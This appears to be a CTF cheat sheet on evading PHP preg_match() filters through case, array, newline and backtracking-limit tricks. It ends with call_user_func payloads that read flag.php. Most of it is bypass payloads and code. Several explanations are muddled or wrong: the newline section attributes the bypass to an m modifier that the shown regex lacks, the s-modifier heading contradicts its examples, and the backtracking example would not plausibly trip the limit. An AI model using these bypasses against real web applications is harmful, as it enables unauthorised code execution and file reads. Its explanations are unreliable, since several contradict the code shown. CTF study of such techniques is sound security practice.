# PHP regex-bypass quick reference

## Core Principle

PHP's `preg_match()` function, when filtering user input, is often bypassed due to poorly designed regular expressions.
Understanding regex modifiers and PHP type behavior is the key to bypassing.

## 1. Case Bypass

**Applicable when**: the regex lacks the `i` (PCRE_CASELESS) modifier

```php
// the filtered regex — no i modifier
preg_match("/n|c/m", $_GET['p']);  // only matches lowercase n and c

// bypass method — use uppercase letters
// nss2 contains n → blocked
// Nss2 contains N → does not match lowercase n → bypass succeeds!
// Ctf contains C → does not match lowercase c → bypass succeeds!

// PHP class and function names are case-insensitive
call_user_func('Nss2::Ctf');  // equivalent to nss2::ctf()
```

**Verification**: first confirm whether the regex has the `i` modifier, then decide whether to use a case bypass

## 2. Array Bypass

**Applicable when**: the function only accepts a string argument, so passing an array returns false

```php
// preg_match()'s second argument requires a string
// pass an array → returns false + a warning → bypasses the regex check

// URL: ?p[]=nss2&p[]=ctf
// $_GET['p'] = ['nss2', 'ctf']  (an array, not a string)
// preg_match("/n|c/m", ['nss2', 'ctf']) → false → bypass!

// call_user_func accepts an array as a callback
call_user_func(['nss2', 'ctf']);  // equivalent to nss2::ctf()
```

## 3. Newline Bypass

**Applicable when**: the regex uses `^...$` anchors + the `m` modifier

```php
// common misconception: the m modifier does not make /n/ match a newline
// the m modifier only affects the matching of ^ and $ (multiline mode)

// cases that can be bypassed:
preg_match("/^flag$/", $input);  // with the m modifier, %0aflag can bypass it

// cases that cannot be bypassed:
preg_match("/n|c/m", $input);    // m does not affect matching of n and c
```

## 4. PCRE Backtracking-Limit Bypass

**Applicable when**: a very long string + a regex with heavy backtracking

```php
// preg_match's default backtracking limit is 1000000
// if exceeded it returns false (not 0 or 1)

// craft a very long string to trigger the backtracking limit
$str = str_repeat('a', 1000000);
preg_match("/.*$/", $str);  // returns false → bypass
```

## 5. `%0a` Newline Injection

**Applicable when**: the regex uses `^...$` but lacks the `s` (DOTALL) modifier

```php
// bypass the ^...$ anchors
// input: "good\nmalicious"
preg_match("/^good$/", "good\nmalicious");  // without m it does not match
preg_match("/^good$/m", "good\nmalicious");  // with m it matches the first line
```

## Common CTF Challenge Patterns

| Type | regex example | bypass method |
|------|----------|----------|
| Case filtering | `/n\|c/m` | `Nss2::Ctf` (case bypass) |
| String-function filtering | `/system\|exec/` | `p[]=class&p[]=method` (array bypass) |
| Anchor matching | `/^flag$/` | `flag%0a` or `%0aflag` (newline bypass) |
| Backtracking limit | `/.*/` | a very long string triggers the PCRE backtracking limit |
| No anchors | `/flag/` | `flflagag` (double-write bypass if str_replace is applied) |

## call_user_func Callback Quick Reference

```php
// call a normal function
call_user_func('readfile', 'flag.php');

// call a static method (string form)
call_user_func('Nss2::Ctf');  // after the case bypass

// call a static method (array form)
call_user_func(['Nss2', 'Ctf']);  // after the array bypass

// call an instance method
call_user_func([$obj, 'method']);
```

## ⚠️ Common Mistakes

1. **`call_user_func('readfile')` with no argument** — reads no file; you must pass `call_user_func('readfile', 'flag.php')`
2. **Confusing the `m` and `i` modifiers** — `m` is multiline mode; `i` is the case-insensitive one
3. **Ignoring PHP type juggling** — `preg_match` returns `false` on an array, not `0`
4. **Guessing the flag content** — you must obtain the real response via tools; do not fabricate it
